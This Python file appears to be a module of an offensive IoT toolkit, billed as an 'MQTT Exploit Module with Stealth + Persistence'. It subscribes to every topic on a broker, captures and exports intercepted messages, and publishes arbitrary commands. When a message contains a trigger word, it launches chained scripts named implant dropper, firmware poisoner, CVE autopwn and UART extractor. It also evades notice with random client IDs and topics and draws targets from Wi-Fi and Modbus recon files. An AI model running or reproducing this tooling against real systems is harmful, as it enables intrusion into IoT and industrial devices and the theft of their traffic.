import paho.mqtt.client as mqtt
import time, json, threading, socket, os, sys, signal, argparse, random, string
from pathlib import Path
from datetime import datetime
import websocket

# Constants
DEFAULT_BROKER = "broker.hivemq.com"
DEFAULT_PORT = 1883
DEFAULT_TOPIC = "#"
RECON_WIFI_FILE = "recon/wifi_scan_results.json"
RECON_MODBUS_FILE = "recon/modbus_scan_results.json"
MQTT_EXPORT_FILE = "reports/mqtt_payloads.json"
ALERT_FILE = "webgui/alerts.json"
KILLCHAIN_FILE = "reports/killchain.json"
CHAIN_SCRIPT_1 = "implant_dropper.py"
CHAIN_SCRIPT_2 = "modules/firmware/firmware_poisoner.py"
CHAIN_SCRIPT_3 = "modules/firmware/cve_autopwn.py"
CHAIN_SCRIPT_4 = "modules/hardware/uart_extractor.py"
CHAIN_SCRIPT_5 = "modules/report_builder.py"
WS_DASHBOARD_URI = "ws://localhost:8765"
AGENT_ID = "mqtt_agent"

os.makedirs("reports", exist_ok=True)
os.makedirs("webgui", exist_ok=True)

payload_export = []

def log(msg):
    timestamp = datetime.utcnow().isoformat()
    entry = f"[{timestamp}] [MQTTX] {msg}"
    print(entry)
    with open("reports/mqttex_hijack.log", "a") as f:
        f.write(entry + "\n")

def graceful_shutdown(sig, frame):
    log("Interrupt received. Shutting down.")
    sys.exit(0)

signal.signal(signal.SIGINT, graceful_shutdown)

def push_alert_websocket(message):
    try:
        ws = websocket.create_connection(WS_DASHBOARD_URI, timeout=3)
        ws.send(json.dumps({
            "agent": AGENT_ID,
            "alert": message,
            "type": "exploit",
            "timestamp": time.time()
        }))
        ws.close()
    except Exception as e:
        log(f"WebSocket alert failed: {e}")

def push_alert_file():
    try:
        with open(ALERT_FILE, "a") as f:
            f.write(json.dumps({
                "agent": AGENT_ID,
                "alert": "MQTT hijack in progress",
                "type": "exploit",
                "timestamp": time.time()
            }) + "\n")
    except Exception as e:
        log(f"File alert failed: {e}")

def update_killchain(event):
    entry = {
        "agent": AGENT_ID,
        "event": event,
        "time": time.time()
    }
    try:
        with open(KILLCHAIN_FILE, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception as e:
        log(f"Killchain update failed: {e}")

def export_payload(topic, payload):
    payload_export.append({
        "timestamp": time.time(),
        "topic": topic,
        "payload": payload
    })
    with open(MQTT_EXPORT_FILE, "w") as f:
        json.dump(payload_export, f, indent=2)

def auto_chain_attacks():
    log("Triggering: implant → firmware poison → CVE autopwn → UART flash → report")
    os.system(f"python3 {CHAIN_SCRIPT_1}")
    time.sleep(2)
    os.system(f"python3 {CHAIN_SCRIPT_2}")
    time.sleep(2)
    os.system(f"python3 {CHAIN_SCRIPT_3}")
    time.sleep(2)
    os.system(f"python3 {CHAIN_SCRIPT_4}")
    time.sleep(2)
    os.system(f"python3 {CHAIN_SCRIPT_5}")

def get_targets_from_recon():
    targets = []
    for path in [RECON_WIFI_FILE, RECON_MODBUS_FILE]:
        if Path(path).exists():
            try:
                with open(path) as f:
                    data = json.load(f)
                    for item in data if isinstance(data, list) else data.values():
                        ip = item.get("ip") or item.get("host") or item.get("target")
                        if ip: targets.append(ip)
            except Exception as e:
                log(f"Recon load failed: {e}")
    return targets

def publish_command(broker, topic, command):
    mqttc = mqtt.Client()
    mqttc.connect(broker, DEFAULT_PORT)
    mqttc.publish(topic, command)
    log(f"[→] Published '{command}' to topic '{topic}'")
    mqttc.disconnect()

def random_string(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def start_client(broker, topic, stealth=False):
    topic_to_subscribe = topic
    client_id = f"redot_client_{random_string()}" if stealth else ""

    if stealth:
        topic_to_subscribe += "/" + random_string(4)

    userdata = {'topic': topic_to_subscribe}
    mqtt_client = mqtt.Client(client_id=client_id, userdata=userdata)
    mqtt_client.on_connect = on_connect
    mqtt_client.on_message = on_message

    log(f"Connecting with{' stealth' if stealth else ''} client_id: {client_id or '[default]'}")
    try:
        mqtt_client.connect(broker, DEFAULT_PORT, 60)
        mqtt_client.loop_forever(retry_first_connection=True)
    except socket.error as e:
        log(f"Socket error: {e}")

def on_connect(client, userdata, flags, rc):
    log(f"Connected to broker with result code {rc}")
    client.subscribe(userdata['topic'])
    log(f"Subscribed to topic: {userdata['topic']}")

def on_message(client, userdata, msg):
    payload = msg.payload.decode(errors='ignore')
    log(f"[←] Topic: {msg.topic} | Payload: {payload}")
    export_payload(msg.topic, payload)
    update_killchain(f"MQTT payload received: {msg.topic}")

    if "start" in payload or "cmd" in payload:
        log("Trigger condition met. Launching chained payloads.")
        push_alert_file()
        push_alert_websocket("Trigger detected on MQTT channel")
        auto_chain_attacks()

def main():
    parser = argparse.ArgumentParser(description="MQTT Exploit Module with Stealth + Persistence")
    parser.add_argument("--broker", help="MQTT broker address")
    parser.add_argument("--topic", help="MQTT topic to subscribe")
    parser.add_argument("--publish", help="Publish a command and exit")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode (random ID + topic noise)")

    args = parser.parse_args()
    broker = args.broker or input(f"MQTT Broker [{DEFAULT_BROKER}]: ") or DEFAULT_BROKER
    topic = args.topic or input(f"Topic to subscribe [{DEFAULT_TOPIC}]: ") or DEFAULT_TOPIC

    if args.publish:
        publish_command(broker, topic, args.publish)
        return

    log("Launching MQTT Hijack Module")
    push_alert_file()
    push_alert_websocket("MQTT hijack module started")
    update_killchain("MQTT hijack module launched")

    targets = get_targets_from_recon()
    if targets:
        log(f"Discovered potential MQTT-reachable targets: {targets}")

    start_client(broker, topic, stealth=args.stealth)

if __name__ == "__main__":
    main()
